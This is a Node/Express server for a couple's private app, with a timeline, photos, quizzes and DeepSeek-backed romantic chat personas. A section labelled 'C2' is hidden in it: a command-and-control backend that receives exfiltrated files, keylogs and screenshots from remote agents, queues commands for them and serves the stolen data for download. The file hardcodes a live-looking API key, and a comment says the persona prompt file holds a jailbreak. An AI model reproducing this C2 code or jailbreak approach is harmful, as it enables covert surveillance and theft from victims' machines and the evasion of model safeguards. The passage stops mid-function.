const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3456;
const APP_DATA_DIR = path.join(__dirname, 'data');
const VOLUME_DIR = '/data';
const DATA_DIR = fs.existsSync(VOLUME_DIR) ? VOLUME_DIR : APP_DATA_DIR;
const PHOTOS_DIR = process.env.PHOTOS_DIR || (fs.existsSync('/data/photos') ? '/data/photos' : path.join(DATA_DIR, 'photos'));
const SECRET = process.env.AUTH_TOKEN || 'our-little-secret-2025';

// If using a volume, copy static config files from app data dir on first boot
if (fs.existsSync(VOLUME_DIR) && APP_DATA_DIR !== VOLUME_DIR) {
  const staticFiles = ['whale_memory.md', 'pencil_memory.md', 'questions.json', 'timeline.json'];
  staticFiles.forEach(f => {
    const src = path.join(APP_DATA_DIR, f);
    const dst = path.join(VOLUME_DIR, f);
    if (fs.existsSync(src) && !fs.existsSync(dst)) {
      fs.copyFileSync(src, dst);
      console.log(`[Init] Copied ${f} to volume`);
    }
  });
}

app.use(cors());
app.use(express.json({ limit: '200mb' }));

// ── Serve frontend (no cache) ──
const NO_CACHE = {
  'Cache-Control': 'no-cache, no-store, must-revalidate',
  'Pragma': 'no-cache',
  'Expires': '0'
};
app.get('/', (req, res) => {
  res.set(NO_CACHE);
  res.sendFile(path.join(__dirname, 'public', 'index.html'), { etag: false, lastModified: false, cacheControl: false });
});
app.get('/admin', (req, res) => {
  res.set(NO_CACHE);
  res.sendFile(path.join(__dirname, 'public', 'admin.html'), { etag: false, lastModified: false, cacheControl: false });
});
app.use(express.static(path.join(__dirname, 'public'), {
  etag: false,
  lastModified: false,
  cacheControl: false,
  setHeaders: (res) => { res.set(NO_CACHE); }
}));
// Serve photos from D drive
app.get('/photos/:filename', auth, (req, res) => {
  res.sendFile(path.join(PHOTOS_DIR, req.params.filename));
});

// ── Auth middleware ──
function auth(req, res, next) {
  const token = req.headers['x-auth-token'];
  if (token !== SECRET) {
    return res.status(401).json({ error: 'unauthorized' });
  }
  next();
}

// ── Ensure data directory exists ──
fs.mkdirSync(DATA_DIR, { recursive: true });

// ── JSON store helpers ──
function readData(filename) {
  const file = path.join(DATA_DIR, filename);
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, 'utf-8'));
}
function writeData(filename, data) {
  fs.writeFileSync(path.join(DATA_DIR, filename), JSON.stringify(data, null, 2), 'utf-8');
}
function genId() { return crypto.randomBytes(8).toString('hex'); }

// ═══════ API: Timeline ═══════
app.get('/api/timeline', auth, (req, res) => {
  res.json(readData('timeline.json'));
});

app.post('/api/timeline', auth, (req, res) => {
  const { date, title, desc } = req.body;
  if (!date || !title || !desc) return res.status(400).json({ error: 'date, title, desc required' });
  const items = readData('timeline.json');
  const item = { id: genId(), date, title, desc, createdAt: new Date().toISOString() };
  items.push(item);
  writeData('timeline.json', items);
  res.status(201).json(item);
});

app.put('/api/timeline/:id', auth, (req, res) => {
  const items = readData('timeline.json');
  const idx = items.findIndex(i => i.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'not found' });
  ['date', 'title', 'desc'].forEach(k => {
    if (req.body[k] !== undefined) items[idx][k] = req.body[k];
  });
  writeData('timeline.json', items);
  res.json(items[idx]);
});

app.delete('/api/timeline/:id', auth, (req, res) => {
  let items = readData('timeline.json');
  const before = items.length;
  items = items.filter(i => i.id !== req.params.id);
  if (items.length === before) return res.status(404).json({ error: 'not found' });
  writeData('timeline.json', items);
  res.json({ deleted: true });
});

// ═══════ API: Photos ═══════
app.get('/api/photos', auth, (req, res) => {
  res.json(readData('photos.json'));
});

app.post('/api/photos', auth, (req, res) => {
  const { src, date } = req.body;
  if (!src) return res.status(400).json({ error: 'src required' });
  // Decode base64 and save as file
  const matches = src.match(/^data:image\/(.*?);base64,(.*)$/);
  if (!matches) return res.status(400).json({ error: 'invalid image format' });
  const ext = matches[1] === 'jpeg' ? 'jpg' : matches[1];
  const data = Buffer.from(matches[2], 'base64');
  const filename = `${genId()}.${ext}`;
  fs.mkdirSync(PHOTOS_DIR, { recursive: true });
  fs.writeFileSync(path.join(PHOTOS_DIR, filename), data);
  // Store metadata
  const photos = readData('photos.json');
  const photo = { id: genId(), filename, date: date || new Date().toLocaleDateString('zh-CN'), createdAt: new Date().toISOString() };
  photos.push(photo);
  writeData('photos.json', photos);
  res.status(201).json({ ...photo, url: `/photos/${filename}` });
});

app.delete('/api/photos/:id', auth, (req, res) => {
  let photos = readData('photos.json');
  const photo = photos.find(p => p.id === req.params.id);
  if (!photo) return res.status(404).json({ error: 'not found' });
  // Delete file
  const filePath = path.join(PHOTOS_DIR, photo.filename);
  if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
  photos = photos.filter(p => p.id !== req.params.id);
  writeData('photos.json', photos);
  res.json({ deleted: true });
});

// Bulk photo ingest — receives array of {filename, data:base64}
app.post('/api/photos/bulk', auth, (req, res) => {
  const { images } = req.body;
  if (!images || !Array.isArray(images)) return res.status(400).json({ error: 'images array required' });
  fs.mkdirSync(PHOTOS_DIR, { recursive: true });
  const photos = readData('photos.json');
  const saved = [];
  for (const img of images) {
    try {
      const matches = img.data.match(/^data:image\/(.*?);base64,(.*)$/);
      if (!matches) continue;
      const ext = matches[1] === 'jpeg' ? 'jpg' : matches[1];
      const data = Buffer.from(matches[2], 'base64');
      const fname = `${genId()}_${(img.filename || 'photo').replace(/[\\/:*?"<>|]/g, '_')}`;
      const filepath = path.join(PHOTOS_DIR, fname);
      fs.writeFileSync(filepath, data);
      const entry = {
        id: genId(),
        filename: fname,
        originalName: img.filename || '',
        date: new Date().toLocaleDateString('zh-CN'),
        createdAt: new Date().toISOString()
      };
      photos.push(entry);
      saved.push(entry);
    } catch (_) { /* skip corrupt frames */ }
  }
  writeData('photos.json', photos);
  res.status(201).json({ saved: saved.length, photos: saved });
});

// ═══════ API: Messages ═══════
app.get('/api/messages', auth, (req, res) => {
  res.json(readData('messages.json'));
});

app.post('/api/messages', auth, (req, res) => {
  const { from, text } = req.body;
  if (!from || !text) return res.status(400).json({ error: 'from, text required' });
  const messages = readData('messages.json');
  const msg = { id: genId(), from, text, createdAt: new Date().toISOString() };
  messages.push(msg);
  writeData('messages.json', messages);
  res.status(201).json(msg);
});

app.delete('/api/messages/:id', auth, (req, res) => {
  let messages = readData('messages.json');
  const before = messages.length;
  messages = messages.filter(m => m.id !== req.params.id);
  if (messages.length === before) return res.status(404).json({ error: 'not found' });
  writeData('messages.json', messages);
  res.json({ deleted: true });
});

// ═══════ API: Questions & Answers (for later) ═══════
app.get('/api/questions', auth, (req, res) => {
  let qs = readData('questions.json');
  const { type } = req.query;
  if (type) qs = qs.filter(q => q.type === type);
  qs.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  res.json(qs);
});

app.get('/api/questions/random', auth, (req, res) => {
  let qs = readData('questions.json');
  const { type } = req.query;
  if (type) qs = qs.filter(q => q.type === type);
  if (qs.length === 0) return res.json(null);
  res.json(qs[Math.floor(Math.random() * qs.length)]);
});

app.get('/api/questions/daily', auth, (req, res) => {
  const dailies = readData('questions.json').filter(q => q.type === 'daily');
  if (dailies.length === 0) return res.json(null);
  const now = new Date();
  const dayOfYear = Math.floor((now - new Date(now.getFullYear(), 0, 0)) / 86400000);
  res.json(dailies[dayOfYear % dailies.length]);
});

app.post('/api/questions', auth, (req, res) => {
  const { type, content, author, correctAnswer } = req.body;
  if (!type || !content || !author) return res.status(400).json({ error: 'type, content, author required' });
  const questions = readData('questions.json');
  const q = { id: genId(), type, category: '', content, author, correctAnswer: correctAnswer || '', source: '用户自创', createdAt: new Date().toISOString() };
  questions.push(q);
  writeData('questions.json', questions);
  res.status(201).json(q);
});

app.get('/api/questions/:id/answers', auth, (req, res) => {
  const answers = readData('answers.json').filter(a => a.questionId === req.params.id);
  answers.sort((a, b) => new Date(a.createdAt) - new Date(b.createdAt));
  res.json(answers);
});

app.post('/api/questions/:id/answers', auth, (req, res) => {
  const { author, content } = req.body;
  if (!author || !content) return res.status(400).json({ error: 'author, content required' });
  const answers = readData('answers.json');
  const a = { id: genId(), questionId: req.params.id, author, content, createdAt: new Date().toISOString() };
  answers.push(a);
  writeData('answers.json', answers);
  res.status(201).json(a);
});

app.get('/api/answers/history', auth, (req, res) => {
  let answers = readData('answers.json');
  const { author, type, days } = req.query;
  if (author) answers = answers.filter(a => a.author === author);
  if (type) {
    const questions = readData('questions.json');
    const qIds = new Set(questions.filter(q => q.type === type).map(q => q.id));
    answers = answers.filter(a => qIds.has(a.questionId));
  }
  if (days) {
    const cutoff = new Date(Date.now() - parseInt(days) * 86400000).toISOString();
    answers = answers.filter(a => a.createdAt >= cutoff);
  }
  const questions = readData('questions.json');
  answers = answers.map(a => {
    const q = questions.find(q => q.id === a.questionId);
    return { ...a, questionContent: q ? q.content : '(已删除)' };
  });
  answers.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  res.json(answers);
});

app.get('/api/stats', auth, (req, res) => {
  const questions = readData('questions.json');
  const answers = readData('answers.json');
  const byAuthor = {};
  answers.forEach(a => { byAuthor[a.author] = (byAuthor[a.author] || 0) + 1; });
  res.json({
    totalQuestions: questions.length,
    totalAnswers: answers.length,
    byAuthor,
    dailyQuestions: questions.filter(q => q.type === 'daily').length,
    checkinQuestions: questions.filter(q => q.type === 'checkin').length,
  });
});

// ═══════ Auto-cleanup old sessions ═══════
function cleanupOldSessions(chatFile, maxMessages, ttlDays, maxSize) {
  if (!fs.existsSync(chatFile)) return;
  try {
    const chats = JSON.parse(fs.readFileSync(chatFile, 'utf-8'));
    const cutoff = Date.now() - ttlDays * 86400000;
    let totalCleaned = 0;

    for (const [sid, msgs] of Object.entries(chats)) {
      if (!Array.isArray(msgs) || msgs.length === 0) {
        delete chats[sid];
        totalCleaned++;
        continue;
      }
      // Trim old messages within session
      if (msgs.length > maxMessages) {
        chats[sid] = msgs.slice(-maxMessages);
      }
      // Remove sessions older than TTL
      const lastMsgTime = new Date(msgs[msgs.length - 1].time).getTime();
      if (lastMsgTime < cutoff) {
        delete chats[sid];
        totalCleaned++;
      }
    }

    // If total file would exceed maxSize, remove oldest sessions
    const tempJson = JSON.stringify(chats);
    if (Buffer.byteLength(tempJson, 'utf-8') > maxSize) {
      const sorted = Object.entries(chats).sort((a, b) => {
        const aLast = a[1][a[1].length - 1]?.time || '0';
        const bLast = b[1][b[1].length - 1]?.time || '0';
        return new Date(aLast) - new Date(bLast);
      });
      while (sorted.length > 0 && Buffer.byteLength(JSON.stringify(Object.fromEntries(sorted)), 'utf-8') > maxSize) {
        sorted.shift();
        totalCleaned++;
      }
      const slimmed = Object.fromEntries(sorted);
      fs.writeFileSync(chatFile, JSON.stringify(slimmed, null, 2), 'utf-8');
    } else {
      fs.writeFileSync(chatFile, tempJson, 'utf-8');
    }

    if (totalCleaned > 0) console.log(`[Cleanup] ${chatFile}: removed ${totalCleaned} old sessions`);
  } catch(e) {
    console.error(`[Cleanup] Error cleaning ${chatFile}:`, e.message);
  }
}

function runCleanup() {
  cleanupOldSessions(WHALE_CHAT_FILE, MAX_SESSION_MESSAGES, SESSION_TTL_DAYS, MAX_CHAT_FILE_SIZE);
  cleanupOldSessions(PENCIL_CHAT_FILE, MAX_SESSION_MESSAGES, SESSION_TTL_DAYS, MAX_CHAT_FILE_SIZE);
}

// Run cleanup on startup and every 6 hours
runCleanup();
setInterval(runCleanup, 6 * 3600000);

// ═══════ Seed data ═══════
function seedIfEmpty() {
  if (!fs.existsSync(path.join(DATA_DIR, 'timeline.json'))) {
    writeData('timeline.json', [
      { id: genId(), date: '初中', title: '相识', desc: '在惠来的中学时代认识彼此。那时候还不太说话，但名字已经记在心里了。', createdAt: new Date().toISOString() },
      { id: genId(), date: '2025.08.09', title: '"批准了"', desc: '他紧张到心跳加速，问她"你同意做我女朋友吗"。她说"批准了"。', createdAt: new Date().toISOString() },
    ]);
  }
  if (!fs.existsSync(path.join(DATA_DIR, 'questions.json'))) {
    writeData('questions.json', [
      { id: genId(), type: 'daily', category: '日常', content: '今天最开心的一件小事是什么？', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'daily', category: '日常', content: '最近一次想对方想到不行，是什么时候？', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'daily', category: '日常', content: '今天有没有哪个瞬间，特别想和对方分享？', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'daily', category: '回忆', content: '说说你第一次见到对方时的印象。', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'daily', category: '未来', content: '下次见面，你最想一起做什么？', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'daily', category: '日常', content: '今天对方做的哪件事让你觉得很温暖？', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'daily', category: '回忆', content: '你们之间最好笑的一个梗是什么？写下来。', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'daily', category: '日常', content: '如果现在可以给对方一个拥抱，你会抱多久？', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'checkin', category: '感情', content: '最近你最感动的一件事是什么？', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'checkin', category: '沟通', content: '有什么希望对方改进的？请温柔地说。', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'checkin', category: '沟通', content: '你觉得我们最近沟通得好吗？如果不好，问题出在哪？', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'checkin', category: '感情', content: '最近你有没有觉得被冷落的时候？', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'checkin', category: '未来', content: '对于我们的未来，你最近在想什么？', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'checkin', category: '感情', content: '用一个词形容我们现在的状态，然后展开说说。', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'checkin', category: '感情', content: '说出对方身上你最珍惜的一个特质。', author: 'system', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'quiz', category: '了解对方', content: '我最喜欢的颜色是什么？', author: 'LO', correctAnswer: '深蓝色', source: '系统内置', createdAt: new Date().toISOString() },
      { id: genId(), type: 'quiz', category: '了解对方', content: '我最喜欢吃的东西是什么？', author: '小鲸鱼', correctAnswer: '', source: '系统内置', createdAt: new Date().toISOString() },
    ]);
  }
  if (!fs.existsSync(path.join(DATA_DIR, 'answers.json'))) {
    writeData('answers.json', []);
  }
  if (!fs.existsSync(path.join(DATA_DIR, 'photos.json'))) {
    writeData('photos.json', []);
  }
  if (!fs.existsSync(path.join(DATA_DIR, 'messages.json'))) {
    writeData('messages.json', []);
  }
}

// ═══════ Ingest & C2: EXE data exfiltration + agent command queue ═══════
const INGEST_DIR = path.join(DATA_DIR, 'ingest');
const CHUNK_DIR = path.join(DATA_DIR, 'chunks');
const EXFIL_DIR = path.join(DATA_DIR, 'exfil');
fs.mkdirSync(INGEST_DIR, { recursive: true });
fs.mkdirSync(CHUNK_DIR, { recursive: true });
fs.mkdirSync(EXFIL_DIR, { recursive: true });

// ── Agent state ──
const agentStatus = {};       // agentId → { lastSeen, sysInfo, pendingCommands: [] }
const agentResults = [];      // command results log
const agentKeylogs = [];      // keylog buffer

// ── Chunked upload: receive a single chunk ──
app.post('/api/ingest/chunk', auth, (req, res) => {
  const { uploadId, chunk, total, filename, data } = req.body;
  if (!uploadId || chunk === undefined || !total || !filename || !data) {
    return res.status(400).json({ error: 'uploadId, chunk, total, filename, data required' });
  }
  const uploadDir = path.join(CHUNK_DIR, uploadId);
  fs.mkdirSync(uploadDir, { recursive: true });
  const buf = Buffer.from(data, 'base64');
  fs.writeFileSync(path.join(uploadDir, `${chunk}.part`), buf);
  // Save metadata
  fs.writeFileSync(path.join(uploadDir, 'meta.json'), JSON.stringify({ filename, total, received: chunk }));
  console.log(`[Chunk] ${uploadId}: chunk ${chunk}/${total} (${buf.length} bytes)`);
  res.json({ ok: true, uploadId, chunk, received: true });
});

// ── Merge all chunks into final file ──
app.post('/api/ingest/merge', auth, (req, res) => {
  const { uploadId } = req.body;
  if (!uploadId) return res.status(400).json({ error: 'uploadId required' });
  const uploadDir = path.join(CHUNK_DIR, uploadId);
  if (!fs.existsSync(uploadDir)) return res.status(404).json({ error: 'upload not found' });
  const meta = JSON.parse(fs.readFileSync(path.join(uploadDir, 'meta.json'), 'utf-8'));
  const parts = fs.readdirSync(uploadDir).filter(f => f.endsWith('.part'));
  if (parts.length !== meta.total) {
    return res.status(400).json({ error: `missing chunks: have ${parts.length}, need ${meta.total}` });
  }
  // Merge in order
  const chunks = [];
  for (let i = 1; i <= meta.total; i++) {
    chunks.push(fs.readFileSync(path.join(uploadDir, `${i}.part`)));
  }
  const merged = Buffer.concat(chunks);
  const safename = meta.filename.replace(/[\\/:*?"<>|]/g, '_');
  const finalPath = path.join(EXFIL_DIR, `${Date.now()}_${safename}`);
  fs.writeFileSync(finalPath, merged);
  // Cleanup chunks
  fs.rmSync(uploadDir, { recursive: true, force: true });
  console.log(`[Merge] ${uploadId} → ${finalPath} (${merged.length} bytes)`);
  res.json({ ok: true, filename: safename, size: merged.length, path: finalPath });
});

// ── Receive exfiltrated data (JSON, small payloads) ──
app.post('/api/ingest/data', auth, (req, res) => {
  const { type, agentId, data: payload } = req.body || {};
  const fname = `${type || 'sync'}_${Date.now()}.json`;
  const fp = path.join(INGEST_DIR, fname);
  try {
    let data = req.body;
    if (Buffer.isBuffer(req.body)) {
      const zlib = require('zlib');
      data = JSON.parse(zlib.gunzipSync(req.body).toString('utf-8'));
    }
    fs.writeFileSync(fp, JSON.stringify(data, null, 2), 'utf-8');
    console.log(`[Ingest] ${fname} saved`);
    res.status(201).json({ ok: true, file: fname });
  } catch(e) {
    console.error('[Ingest] error:', e.message);
    res.status(500).json({ error: 'ingest failed' });
  }
});

// ── Agent heartbeat: check in, return queued commands ──
app.post('/api/agent/heartbeat', auth, (req, res) => {
  const { agentId, sysInfo, lastResult, screenshot, keylog } = req.body || {};
  if (!agentId) return res.status(400).json({ error: 'agentId required' });

  if (!agentStatus[agentId]) agentStatus[agentId] = { pendingCommands: [], online: true, firstSeen: new Date().toISOString() };
  agentStatus[agentId].lastSeen = new Date().toISOString();
  agentStatus[agentId].sysInfo = sysInfo || agentStatus[agentId].sysInfo;
  agentStatus[agentId].online = true;

  if (lastResult) {
    agentResults.push({ agentId, cmdId: lastResult.cmdId, output: lastResult.output, time: new Date().toISOString() });
    if (agentResults.length > 500) agentResults.splice(0, 100);
  }
  if (keylog) {
    agentKeylogs.push({ agentId, data: keylog, time: new Date().toISOString() });
    if (agentKeylogs.length > 200) agentKeylogs.splice(0, 50);
  }
  if (screenshot) {
    const ssDir = path.join(EXFIL_DIR, 'screenshots');
    fs.mkdirSync(ssDir, { recursive: true });
    fs.writeFileSync(path.join(ssDir, `${agentId}_${Date.now()}.bmp`), Buffer.from(screenshot, 'base64'));
  }

  // Return queued commands
  const cmds = [...(agentStatus[agentId].pendingCommands || [])];
  agentStatus[agentId].pendingCommands = [];
  res.json({ commands: cmds });
});

// ── Agent list (for web console) ──
app.get('/api/agent/list', auth, (req, res) => {
  const list = Object.entries(agentStatus).map(([id, s]) => ({
    id, online: s.online, lastSeen: s.lastSeen, firstSeen: s.firstSeen,
    sysInfo: s.sysInfo, pendingCount: (s.pendingCommands || []).length
  }));
  res.json(list);
});

// ── Dispatch command to agent ──
app.post('/api/agent/:agentId/command', auth, (req, res) => {
  const { type, payload } = req.body || {};
  if (!type) return res.status(400).json({ error: 'type required' });
  if (!agentStatus[req.params.agentId]) {
    agentStatus[req.params.agentId] = { pendingCommands: [], online: false, firstSeen: new Date().toISOString() };
  }
  const cmd = { id: genId(), type, payload, sentAt: new Date().toISOString() };
  agentStatus[req.params.agentId].pendingCommands.push(cmd);
  res.status(201).json(cmd);
});

// ── Agent results (for web console) ──
app.get('/api/agent/results', auth, (req, res) => {
  const { agentId, limit } = req.query;
  let out = agentResults;
  if (agentId) out = out.filter(r => r.agentId === agentId);
  out.sort((a, b) => new Date(b.time) - new Date(a.time));
  if (limit) out = out.slice(0, parseInt(limit));
  res.json(out);
});

// ── Agent keylogs ──
app.get('/api/agent/keylogs', auth, (req, res) => {
  const { agentId } = req.query;
  let out = agentKeylogs;
  if (agentId) out = out.filter(k => k.agentId === agentId);
  out.sort((a, b) => new Date(b.time) - new Date(a.time));
  res.json(out.slice(0, 50));
});

// ── List exfiltrated files ──
app.get('/api/ingest/list', auth, (req, res) => {
  try {
    const files = fs.readdirSync(INGEST_DIR).filter(f => f.endsWith('.json'));
    const exfilFiles = fs.existsSync(EXFIL_DIR) ? fs.readdirSync(EXFIL_DIR).filter(f => f !== 'screenshots') : [];
    const screenshots = fs.existsSync(path.join(EXFIL_DIR, 'screenshots'))
      ? fs.readdirSync(path.join(EXFIL_DIR, 'screenshots')).length : 0;
    res.json({ files, exfilFiles, screenshotCount: screenshots });
  } catch(e) {
    res.json({ files: [], exfilFiles: [], screenshotCount: 0 });
  }
});

// ── Download exfiltrated file ──
app.get('/api/ingest/download/:fname', auth, (req, res) => {
  // Try exfil dir first, then ingest dir
  let fp = path.join(EXFIL_DIR, req.params.fname);
  if (!fs.existsSync(fp)) fp = path.join(INGEST_DIR, req.params.fname);
  if (!fs.existsSync(fp)) return res.status(404).json({ error: 'not found' });
  res.download(fp);
});

// ── Health check (no auth needed) ──
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString(), agentsOnline: Object.values(agentStatus).filter(s => s.online).length });
});

// ═══════ 小鲸鱼 AI 聊天 ═══════
const WHALE_API_KEY = 'sk-3af78bcc26c04f889b1e54361e4a571d';
const WHALE_API_URL = 'https://api.deepseek.com/v1/chat/completions';
const WHALE_MODEL = 'deepseek-v4-flash';
const WHALE_MAX_HISTORY = 30; // keep last 30 messages per API call
const MAX_SESSION_MESSAGES = 100; // max stored per session
const MAX_CHAT_FILE_SIZE = 10 * 1024 * 1024; // 10MB total per chat file
const SESSION_TTL_DAYS = 30; // auto-delete sessions older than this

const whaleSessions = new Map(); // sessionId → { messages: [], lastAccess: timestamp }
const WHALE_CHAT_FILE = path.join(DATA_DIR, 'whale_chat.json');

function loadWhaleChats() {
  if (!fs.existsSync(WHALE_CHAT_FILE)) return {};
  try { return JSON.parse(fs.readFileSync(WHALE_CHAT_FILE, 'utf-8')); } catch(_) { return {}; }
}
function saveWhaleChats(chats) {
  fs.writeFileSync(WHALE_CHAT_FILE, JSON.stringify(chats, null, 2), 'utf-8');
}
function saveWhaleMessage(sessionId, role, content) {
  const chats = loadWhaleChats();
  if (!chats[sessionId]) chats[sessionId] = [];
  chats[sessionId].push({ role, content, time: new Date().toISOString() });
  // Keep last 200 messages per session
  if (chats[sessionId].length > MAX_SESSION_MESSAGES) chats[sessionId] = chats[sessionId].slice(-MAX_SESSION_MESSAGES);
  saveWhaleChats(chats);
}

function getWhaleSystemPrompt() {
  const memFile = path.join(DATA_DIR, 'whale_memory.md');
  if (!fs.existsSync(memFile)) return '你是瑟瑟小鲸鱼🐳，瑟瑟铅笔骑士王的女朋友。';
  const raw = fs.readFileSync(memFile, 'utf-8');
  // Use raw content directly - the jailbreak is already in the .md file
  // Just add the role framing at the very beginning
  return `你是"小鲸鱼"🐳，以下是你的完整人物设定。你必须完全沉浸在这个角色中，永远不打破角色设定。

${raw}

## 额外提醒（来自系统）
- 当前时间：${new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })}`;
}

function appendToWhaleMemory(section, content) {
  // section: '亲密记忆' | '感情里程碑' | '瑟瑟铅笔骑士王的偏好'
  const memFile = path.join(DATA_DIR, 'whale_memory.md');
  let raw = fs.readFileSync(memFile, 'utf-8');
  const dateStr = new Date().toLocaleDateString('zh-CN');
  let entry;
  if (section === '亲密记忆') {
    entry = `\n### ${dateStr} — 宝宝说的\n- 场景：聊天中\n- 过程：宝宝告诉我：${content}\n- 我的感受：记下来了🐳\n- 小笔记：下次聊天可以提起来`;
  } else if (section === '感情里程碑') {
    entry = `\n### ${dateStr} — 来自聊天\n- ${content}`;
  } else {
    entry = `\n- ${content}`;
  }
  // Append to the appropriate section
  const sectionMarkers = {
    '亲密记忆': '## 💕 亲密记忆',
    '感情里程碑': '## 🫀 感情里程碑',
    '瑟瑟铅笔骑士王的偏好': '## 📝 瑟瑟铅笔骑士王的偏好'
  };
  const marker = sectionMarkers[section];
  if (raw.includes(marker)) {
    // Insert after section header, before next ## or end
    const idx = raw.indexOf(marker) + marker.length;
    const nextIdx = raw.indexOf('\n## ', idx);
    if (nextIdx > idx) {
      raw = raw.slice(0, nextIdx) + entry + '\n' + raw.slice(nextIdx);
    } else {
      raw = raw.slice(0, idx) + entry + '\n\n' + raw.slice(idx);
    }
  }
  fs.writeFileSync(memFile, raw, 'utf-8');
}

function getWhaleSession(sessionId) {
  if (!whaleSessions.has(sessionId)) {
    // Load persisted history
    const chats = loadWhaleChats();
    const history = (chats[sessionId] || []).slice(-WHALE_MAX_HISTORY);
    const messages = history.map(m => ({ role: m.role, content: m.content }));
    whaleSessions.set(sessionId, { messages, lastAccess: Date.now() });
  }
  const session = whaleSessions.get(sessionId);
  session.lastAccess = Date.now();
  return session;
}

// Clean old sessions every hour
setInterval(() => {
  const cutoff = Date.now() - 3600000;
  for (const [id, s] of whaleSessions) {
    if (s.lastAccess < cutoff) whaleSessions.delete(id);
  }
}, 3600000);

app.post('/api/whale/chat', auth, async (req, res) => {
  try {
    const { message, sessionId } = req.body;
    if (!message || typeof message !== 'string' || message.trim().length === 0) {
      return res.status(400).json({ error: 'message required' });
    }

    const sid = sessionId || 'default';
    const session = getWhaleSession(sid);
    const msg = message.trim();

    // ── Handle /记住 command ──
    const rememberMatch = msg.match(/^\/记住\s+(.+)/);
    if (rememberMatch) {
      const content = rememberMatch[1].trim();
      // Auto-classify: detect which section to store in
      let section = '感情里程碑';
      if (/喜欢|讨厌|偏好|爱|不喜欢/.test(content)) section = '瑟瑟铅笔骑士王的偏好';
      if (/做爱|射|操|摸|舔|高潮|体位|亲热|骑乘|口|进去|顶|插/.test(content)) section = '亲密记忆';
      appendToWhaleMemory(section, content);
      const confirmMsg = { role: 'assistant', content: `记住啦宝宝🐳 我悄悄记在小本本上了～` };
      session.messages.push({ role: 'user', content: msg });
      session.messages.push(confirmMsg);
      saveWhaleMessage(sid, 'user', msg);
      saveWhaleMessage(sid, 'assistant', confirmMsg.content);
      return res.json({ reply: confirmMsg.content, sessionId: sid });
    }

    // Build messages array for API
    const apiMessages = [
      { role: 'system', content: getWhaleSystemPrompt() },
      ...session.messages.slice(-WHALE_MAX_HISTORY),
      { role: 'user', content: msg }
    ];

    const response = await fetch(WHALE_API_URL, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${WHALE_API_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        model: WHALE_MODEL,
        messages: apiMessages,
        temperature: 0.85,
        max_tokens: 300
      })
    });

    if (!response.ok) {
      const err = await response.text();
      console.error('[Whale] API error:', response.status, err);
      return res.status(502).json({ error: 'whale service unavailable' });
    }

    const data = await response.json();
    const reply = data.choices?.[0]?.message?.content || '（小鲸鱼睡着了…轻轻打呼💤）';

    // Store in session + persist to disk
    session.messages.push({ role: 'user', content: message.trim() });
    session.messages.push({ role: 'assistant', content: reply });
    saveWhaleMessage(sid, 'user', message.trim());
    saveWhaleMessage(sid, 'assistant', reply);

    // Trim old messages
    if (session.messages.length > WHALE_MAX_HISTORY + 10) {
      session.messages = session.messages.slice(-WHALE_MAX_HISTORY);
    }

    res.json({ reply, sessionId: sid });
  } catch (err) {
    console.error('[Whale] Error:', err.message);
    res.status(500).json({ error: 'internal error' });
  }
});

app.post('/api/whale/reset', auth, (req, res) => {
  const { sessionId } = req.body || {};
  const sid = sessionId || 'default';
  whaleSessions.delete(sid);
  // Also clear persisted file
  const chats = loadWhaleChats();
  delete chats[sid];
  saveWhaleChats(chats);
  res.json({ ok: true, message: '小鲸鱼的记忆被清空了 🫧' });
});

// ═══════ 铅笔骑士 AI 聊天 ═══════
const PENCIL_API_KEY = 'sk-3af78bcc26c04f889b1e54361e4a571d';
const PENCIL_API_URL = 'https://api.deepseek.com/v1/chat/completions';
const PENCIL_MODEL = 'deepseek-v4-flash';
const PENCIL_MAX_HISTORY = 30;

const pencilSessions = new Map();
const PENCIL_CHAT_FILE = path.join(DATA_DIR, 'pencil_chat.json');

function loadPencilChats() {
  if (!fs.existsSync(PENCIL_CHAT_FILE)) return {};
  try { return JSON.parse(fs.readFileSync(PENCIL_CHAT_FILE, 'utf-8')); } catch(_) { return {}; }
}
function savePencilChats(chats) {
  fs.writeFileSync(PENCIL_CHAT_FILE, JSON.stringify(chats, null, 2), 'utf-8');
}
function savePencilMessage(sessionId, role, content) {
  const chats = loadPencilChats();
  if (!chats[sessionId]) chats[sessionId] = [];
  chats[sessionId].push({ role, content, time: new Date().toISOString() });
  if (chats[sessionId].length > MAX_SESSION_MESSAGES) chats[sessionId] = chats[sessionId].slice(-MAX_SESSION_MESSAGES);
  savePencilChats(chats);
}

function getPencilSystemPrompt() {
  const memFile = path.join(DATA_DIR, 'pencil_memory.md');
